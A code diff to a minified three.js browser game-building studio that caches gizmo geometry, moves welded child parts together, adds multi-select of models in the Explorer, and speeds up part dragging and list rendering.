     [[0,'#ff4444',[1,0,0]],[1,'#44dd44',[0,1,0]],[2,'#4488ff',[0,0,1]]].forEach(function(a){
-      const g=new THREE.Group(),m=new THREE.Mesh(new THREE.TorusGeometry(3.2,.16,12,96),new THREE.MeshBasicMaterial({color:a[1],depthTest:false}));
+      const g=new THREE.Group(),m=new THREE.Mesh(GZG.ring,new THREE.MeshBasicMaterial({color:a[1],depthTest:false}));
       m.renderOrder=10;m.userData.rotAx=a[0];g.add(m);g.userData.ri=-1;
       g.quaternion.setFromUnitVectors(new THREE.Vector3(0,0,1),new THREE.Vector3(a[2][0],a[2][1],a[2][2])).premultiply(oq);
       g.position.set(rc[0],rc[1],rc[2]);editG.add(g);gizmo.push(m)});return}
@@ -2115,12 +2161,12 @@ function buildEdit(){try{updTool()}catch(e){}while(editG.children.length)editG.r
     const r1=rotOne(),rq=r1?rotQ(r1):null;if(rq)ln.quaternion.copy(rq);
     [[1,0,0,'#ff4444'],[-1,0,0,'#ff4444'],[0,1,0,'#44dd44'],[0,-1,0,'#44dd44'],[0,0,1,'#4488ff'],[0,0,-1,'#4488ff']].forEach(function(a){
       const ld=new THREE.Vector3(a[0],a[1],a[2]),d=rq?ld.clone().applyQuaternion(rq):ld,ax=a[0]?0:a[1]?1:2,off=half[ax]+.45,
-        hd=new THREE.Mesh(new THREE.SphereGeometry(.32,20,14),new THREE.MeshBasicMaterial({color:a[3],depthTest:false}));
+        hd=new THREE.Mesh(GZG.ball,new THREE.MeshBasicMaterial({color:a[3],depthTest:false}));
       hd.position.set(c[0]+d.x*off,c[1]+d.y*off,c[2]+d.z*off);hd.renderOrder=10;hd.userData.axis=d;if(rq)hd.userData.lax=ld;hd.userData.scale=true;hd.userData.fx={b:new THREE.Vector3(c[0]+d.x*half[ax],c[1]+d.y*half[ax],c[2]+d.z*half[ax]),d:d,off:.45};editG.add(hd);gizmo.push(hd)});
     return}
   [[1,0,0,'#ff4444'],[-1,0,0,'#ff4444'],[0,1,0,'#44dd44'],[0,-1,0,'#44dd44'],[0,0,1,'#4488ff'],[0,0,-1,'#4488ff']].forEach(function(a){
     const d=new THREE.Vector3(a[0],a[1],a[2]),mt=new THREE.MeshBasicMaterial({color:a[3],depthTest:false}),g=new THREE.Group(),
-      sh=new THREE.Mesh(new THREE.CylinderGeometry(.07,.07,1.3,8),mt),co=new THREE.Mesh(new THREE.ConeGeometry(.22,.55,12),mt),
+      sh=new THREE.Mesh(GZG.sh,mt),co=new THREE.Mesh(GZG.co,mt),
       off=Math.abs(a[0])*half[0]+Math.abs(a[1])*half[1]+Math.abs(a[2])*half[2]+.3;
     sh.position.y=.65;co.position.y=1.6;const hb=arrowHit();[sh,co,hb].forEach(function(m){m.renderOrder=10;m.userData.axis=d;g.add(m);gizmo.push(m)});
     g.quaternion.setFromUnitVectors(new THREE.Vector3(0,1,0),d);g.position.set(c[0]+a[0]*off,c[1]+a[1]*off,c[2]+a[2]*off);g.userData.fx={b:new THREE.Vector3(c[0]+a[0]*(off-.3),c[1]+a[1]*(off-.3),c[2]+a[2]*(off-.3)),d:d,off:.3};editG.add(g);gz.push(g)})}
@@ -2142,7 +2188,10 @@ function selBox(){const a=sel.map(function(id){return byId(id)}).filter(Boolean)
   const lo=[1e9,1e9,1e9],hi=[-1e9,-1e9,-1e9];a.forEach(function(p){for(let i=0;i<3;i++){lo[i]=Math.min(lo[i],p.pos[i]-p.size[i]/2);hi[i]=Math.max(hi[i],p.pos[i]+p.size[i]/2)}});
   return {c:[0,1,2].map(function(i){return (lo[i]+hi[i])/2}),h:[0,1,2].map(function(i){return (hi[i]-lo[i])/2})}}
 /* Move everything selected (welded children already follow their parent, so they are not moved twice) */
-function moveSel(d){const ids=sel.slice();ids.forEach(function(id){const p=byId(id);if(!p)return;let a=p.parent&&byId(p.parent),skip=false;while(a){if(ids.indexOf(a.id)>=0){skip=true;break}a=a.parent&&byId(a.parent)}if(!skip)moveBy(p,d)})}
+function kidMap(){const ch=new Map();P.parts.forEach(function(c){if(c.parent){let a=ch.get(c.parent);if(!a){a=[];ch.set(c.parent,a)}a.push(c)}});return ch}
+function moveSel(d,ch){const ids=sel.slice(),set=new Set(ids);ch=ch||kidMap();
+  const mv=function(p){[p.pos,p.pivot].forEach(function(v){if(v)for(let i=0;i<3;i++)v[i]+=d[i]});const k=ch.get(p.id);if(k)k.forEach(mv)};
+  ids.forEach(function(id){const p=byId(id);if(!p)return;let a=p.parent&&byId(p.parent),skip=false;while(a){if(set.has(a.id)){skip=true;break}a=a.parent&&byId(a.parent)}if(!skip)mv(p)})}
 /* Resize tool (press E): drag a face handle to stretch that side while the opposite side stays put. Ctrl = resize from both sides. Alt = no snapping. */
 function updTool(){}
 /* Everything the resize tool will stretch: the selection plus, for rigs, every welded part of the rig */
@@ -2232,8 +2281,15 @@ function pick(id,add,indiv){selFold=null;{const q=id&&byId(id);if(q)snapRig(root
   else if(add){sel=sel.indexOf(id)>=0?sel.filter(function(x){return x!==id}):sel.concat(id);selModel=null}
   else{sel=[id];selModel=null}
   selIndiv=(indiv&&p&&!p.av)?sel.slice():null;
+  hl();buildEdit();renderPartsSoon()}
+function pickModel(mid,add){selFold=null;if(animOn()){const r=partsOf(mid).find(function(p){return !p.parent&&kids(p).length});animSelect(r||null);return}
+  const ids=partsOf(mid).map(function(q){return q.id});
+  if(add){/* Ctrl / Shift / Cmd + click in the Explorer: add this model to the selection, or take it out again if all of it is already picked */
+    selSvc=null;selGui=null;const have=sel.slice(),inSel=new Set(have),all=ids.length>0&&ids.every(function(x){return inSel.has(x)});
+    if(all){const rm=new Set(ids);sel=have.filter(function(x){return !rm.has(x)})}else sel=have.concat(ids.filter(function(x){return !inSel.has(x)}));
+    selModel=null;selIndiv=null}
+  else{sel=ids;selModel=sel.length?mid:null}
   hl();buildEdit();renderParts()}
-function pickModel(mid){selFold=null;if(animOn()){const r=partsOf(mid).find(function(p){return !p.parent&&kids(p).length});animSelect(r||null);return}sel=partsOf(mid).map(function(q){return q.id});selModel=sel.length?mid:null;hl();buildEdit();renderParts()}
 function group(){let ids=sel.filter(function(id){const p=byId(id);return p&&!p.av});{const set={};ids.forEach(function(id){set[id]=1;const r=rootOf(byId(id));if(kids(r).length)treeOf(r).forEach(function(q){set[q.id]=1})});ids=Object.keys(set)}
   if(!ids.length){msg('Select the part(s) you want to group first.');return}
   let n=1,nm='Model';while(P.models.some(function(m){return m.name===nm}))nm='Model'+(++n);
@@ -2896,7 +2952,7 @@ function buildAnimGizmo(){const t=animTarget();if(!t||!J[t.id])return;
   agT=t.id;const half=[t.size[0]/2,t.size[1]/2,t.size[2]/2];
   [[1,0,0,'#ff4444'],[-1,0,0,'#ff4444'],[0,1,0,'#44dd44'],[0,-1,0,'#44dd44'],[0,0,1,'#4488ff'],[0,0,-1,'#4488ff']].forEach(function(a){
     const d=new THREE.Vector3(a[0],a[1],a[2]),mt=new THREE.MeshBasicMaterial({color:a[3],depthTest:false}),g=new THREE.Group(),
-      sh=new THREE.Mesh(new THREE.CylinderGeometry(.07,.07,1.3,8),mt),co=new THREE.Mesh(new THREE.ConeGeometry(.22,.55,12),mt),
+      sh=new THREE.Mesh(GZG.sh,mt),co=new THREE.Mesh(GZG.co,mt),
       off=Math.min(Math.abs(a[0])*half[0]+Math.abs(a[1])*half[1]+Math.abs(a[2])*half[2],8)+.3;
     sh.position.y=.65;co.position.y=1.6;const hb=arrowHit();[sh,co,hb].forEach(function(m){m.renderOrder=10;m.userData.axis=d;g.add(m);gizmo.push(m)});
     g.quaternion.setFromUnitVectors(AY,d);g.userData.off=d.clone().multiplyScalar(off);editG.add(g);gz.push(g)})}
@@ -3213,25 +3269,35 @@ function tiltSel(dir){if(animOn()||rigOn)return;const rs=rotRoots();if(!rs.lengt
     if(nr[0]||nr[1]||nr[2])p.rot=nr;else delete p.rot;if(kids(p).length){delete rig0[p.id];snapRig(p)}});
   all()}
 addEventListener('keydown',function(e){if(!(gd&&gd.mv)||e.ctrlKey||e.metaKey||e.altKey||e.repeat)return;
-  if(e.code==='KeyR'){e.preventDefault();e.stopImmediatePropagation();rotateSel(e.shiftKey?-1:1)}
-  else if(e.code==='KeyT'){e.preventDefault();e.stopImmediatePropagation();tiltSel(e.shiftKey?-1:1)}},true);
+  if(e.code==='KeyR'){e.preventDefault();e.stopImmediatePropagation();gd.box=gd.cand=gd.mset=gd.sg=null;rotateSel(e.shiftKey?-1:1)}
+  else if(e.code==='KeyT'){e.preventDefault();e.stopImmediatePropagation();gd.box=gd.cand=gd.mset=gd.sg=null;tiltSel(e.shiftKey?-1:1)}},true);
 /* Dragging snaps to whatever is under the mouse: the part slides along the top of blocks and the ground, and sticks to the sides of walls. The dragged parts are ignored by the
    ray, so you hit the things behind them. Over the sky it slides along the height it was grabbed at. */
 function dragBox(){const lo=[1e9,1e9,1e9],hi=[-1e9,-1e9,-1e9];let n=0;
   sel.forEach(function(id){const p=byId(id);if(!p||p.stab)return;const q=eh(p);n++;for(let i=0;i<3;i++){lo[i]=Math.min(lo[i],p.pos[i]-q[i]);hi[i]=Math.max(hi[i],p.pos[i]+q[i])}});
   return n?{lo:lo,hi:hi,c:[0,1,2].map(function(i){return (lo[i]+hi[i])/2}),h:[0,1,2].map(function(i){return (hi[i]-lo[i])/2})}:null}
-function rmoveDrag(e){const g=gd,b=dragBox();if(!b)return;
+function rmoveDrag(e){const g=gd;if(!g.box)g.box=dragBox();const b=g.box;if(!b)return;
   /* a click that wiggles a little is still just a click: the part only moves once the mouse has travelled 24 pixels */
-  if(!g.on){if(!look&&Math.hypot(e.clientX-g.sx,e.clientY-g.sy)<24)return;g.on=true}ray.setFromCamera(ndc(e),camera);
-  const skip={};sel.forEach(function(id){skip[id]=1});
-  const hit=ray.intersectObjects(pickable().filter(function(m){return !skip[m.userData.id]}),false)[0];let pt,ax=1,sg=1;
+  if(!g.on){if(!look&&Math.hypot(e.clientX-g.sx,e.clientY-g.sy)<24)return;g.on=true}
+  /* the frame loop calls this every frame: if the mouse and camera have not changed there is nothing new to work out */
+  const sgn=e.clientX+'|'+e.clientY+'|'+(e.altKey?1:0)+'|'+cam.x+'|'+cam.y+'|'+cam.z+'|'+cam.yaw+'|'+cam.pit;if(g.sg===sgn)return;g.sg=sgn;
+  /* what the part can land on is worked out once per drag (and again only if the world was rebuilt, e.g. after R or T) */
+  if(g.cm!==M||!g.cand){const skip={};sel.forEach(function(id){skip[id]=1});g.cand=pickable().filter(function(m){return !skip[m.userData.id]});g.cm=M;
+    if(!g.mset){const ch=kidMap(),set=new Set(),add=function(p){set.add(p.id);const k=ch.get(p.id);if(k)k.forEach(add)};let rig=false;sel.forEach(function(id){const p=byId(id);if(!p)return;add(p);if(p.parent||ch.has(p.id))rig=true});g.ch=ch;g.mset=set;g.rig=rig}}
+  ray.setFromCamera(ndc(e),camera);
+  const hit=ray.intersectObjects(g.cand,false)[0];let pt,ax=1,sg2=1;
   if(hit&&hit.distance<800){pt=hit.point;const nn=hit.face.normal.clone().transformDirection(hit.object.matrixWorld),a=[Math.abs(nn.x),Math.abs(nn.y),Math.abs(nn.z)];
-    ax=a[0]>=a[1]&&a[0]>=a[2]?0:a[1]>=a[2]?1:2;sg=nn.getComponent(ax)>=0?1:-1}
+    ax=a[0]>=a[1]&&a[0]>=a[2]?0:a[1]>=a[2]?1:2;sg2=nn.getComponent(ax)>=0?1:-1}
   else{const v=ray.ray.intersectPlane(new THREE.Plane(new THREE.Vector3(0,1,0),-g.y),new THREE.Vector3());if(!v)return;pt=v}
   const free=e.altKey,sn=function(v){return snapV(v,free)},w=[pt.x,pt.y,pt.z],c=[0,0,0];
-  for(let i=0;i<3;i++){if(i!==ax)c[i]=sn(w[i]);else{const face=sn(w[i]);c[i]=face+sg*b.h[i]}}
+  for(let i=0;i<3;i++){if(i!==ax)c[i]=sn(w[i]);else{const face=sn(w[i]);c[i]=face+sg2*b.h[i]}}
   const d=[c[0]-b.c[0],c[1]-b.c[1],c[2]-b.c[2]].map(function(v){return Math.round(v*1000)/1000});
-  if(Math.abs(d[0])+Math.abs(d[1])+Math.abs(d[2])<1e-4)return;moveSel(d);quickSync()}
+  if(Math.abs(d[0])+Math.abs(d[1])+Math.abs(d[2])<1e-4)return;
+  moveSel(d,g.ch);
+  /* keep the cached box and the move arrows with the parts instead of measuring and rebuilding everything */
+  for(let i=0;i<3;i++){b.lo[i]+=d[i];b.hi[i]+=d[i];b.c[i]+=d[i]}
+  editG.children.forEach(function(o){const f=o.userData.fx;if(f){f.b.x+=d[0];f.b.y+=d[1];f.b.z+=d[2]}else{o.position.x+=d[0];o.position.y+=d[1];o.position.z+=d[2]}});
+  quickSync(g.mset,g.rig)}
 cv.ondblclick=function(e){if(playing||rigOn||animOn())return;ray.setFromCamera(ndc(e),camera);{const gh=ray.intersectObjects(gizmo,false)[0];if(gh&&gh.object.userData.rotAx!==undefined){rotReset();return}}const h=ray.intersectObjects(pickSel(),false)[0];if(h)pick(h.object.userData.id,false,true)};
 /* Mouse-look only lasts while the right button is really held. If the release was missed (alt-tab, two-finger tap, context menu), look stayed on and the camera (and your character, which follows it) kept spinning with every mouse move. */
 function dropLook(){if(!look)return;look=false;if(document.pointerLockElement===cv&&!lockMode())try{document.exitPointerLock()}catch(x){}}
@@ -5012,7 +5078,9 @@ function addScript(o,t){const h=mk(t);if(o){h.o=o;if(byModel(o))openM[o]=true}
   const d=CV&&Array.from(CV.children).find(function(x){return x._s&&x._s[0]===h});if(d)d.scrollIntoView({block:'nearest',inline:'nearest'});
   msg('Added a script'+(o&&ownName(o)?' inside '+ownName(o):'')+'. Drag blocks under it.')}
 
-function renderParts(){const l=$('p-list');l.replaceChildren();
+var SELSET=new Set(),rpPend=0;
+function renderPartsSoon(){if(rpPend)return;rpPend=requestAnimationFrame(function(){rpPend=0;renderParts()})}
+function renderParts(){if(rpPend){cancelAnimationFrame(rpPend);rpPend=0}const l=$('p-list');l.replaceChildren();SELSET=new Set(sel);
   const scrOf=function(id){return P.scripts.filter(function(s){return s[0].o===id})};
   function scrRow(sc,d,tail){const h=sc[0],D=BD[h.t],n=sc.length-(D.hat?1:0),on=D.hat?ownName(h.o):null;
     xrow({d:d,ic:'\u270E',icc:'#c9822b',nm:(D.hat?(KW[h.t]||h.t)+(h.a.length?' '+h.a.join(' '):''):'Loose blocks')+(tail&&on?'  ('+on+')':''),
@@ -5028,7 +5096,7 @@ function renderParts(){const l=$('p-list');l.replaceChildren();
       P.models.forEach(function(m){const ps=partsOf(m.id).filter(function(p){return svcOf(p)===key});if(!ps.length||inF(ps[0])!==fid)return;c++;
         const open=openM[m.id]!==false;
         xrow({d:d,ic:'\u25A3',icc:'#8a5cf6',nm:m.name,bd:[ps.length+(ps.length===1?' part':' parts')].concat(ps.every(function(q){return q.locked})?['\uD83D\uDD12 locked']:[]),open:open,onTg:function(){openM[m.id]=!open;renderParts()},
-          on:selModel===m.id,go:function(){pickModel(m.id)},plus:{t:'model',id:m.id},dragT:'model',dragId:m.id,drop:{t:'model',id:m.id}});
+          on:selModel===m.id||(ps.length>0&&sel.length>=ps.length&&ps.every(function(q){return SELSET.has(q.id)})),go:function(e){pickModel(m.id,!!e&&(e.ctrlKey||e.shiftKey||e.metaKey))},plus:{t:'model',id:m.id},dragT:'model',dragId:m.id,drop:{t:'model',id:m.id}});
         if(open){scrRows(m.id,d+1);ps.filter(function(p){return !p.parent}).forEach(function(p){prow(p,d+1,false)})}});
       P.parts.filter(function(p){return !p.parent&&!p.model&&svcOf(p)===key&&inF(p)===fid}).forEach(function(p){c++;prow(p,d,false)});return c};
     (P.folders||[]).filter(function(f){return (f.svc||'world')===key}).forEach(function(f){n++;const open=openF[f.id]!==false,cnt=countF(f.id,key);
@@ -5831,7 +5899,7 @@ try{const u=new URL(location.href),cd=u.searchParams.get('coop');if(cd&&!VIEWONL
 if(VIEWONLY){$('studio').classList.add('vo');setFs(true,true);
   document.querySelector('#studio .logo h1').textContent=P.name+(PLAYINFO&&PLAYINFO.owner?'  -  by '+PLAYINFO.owner:'');
   $('s-fs').onclick=function(){try{if(document.fullscreenElement)document.exitFullscreen();else document.documentElement.requestFullscreen()}catch(x){}};
-  $('s-fs').textContent='Fullscreen';setTimeout(function(){$('s-play').click();netJoin()},60);bbHud()}
+  $('s-fs').textContent='Fullscreen';setTimeout(function(){$('s-play').click();netJoin()},60);bbHud();setTimeout(function(){BBREADY=true;bbReadyTry()},900)}
 /* ===== Items: made from a mesh in the item room, given with the "give item" block, held from the hotbar ===== */
 function itemsL(){return P.items=Array.isArray(P.items)?P.items:[]}
 function itemBy(n){const k=String(n).trim().toLowerCase();return itemsL().find(function(i){return String(i.name).toLowerCase()===k})||null}
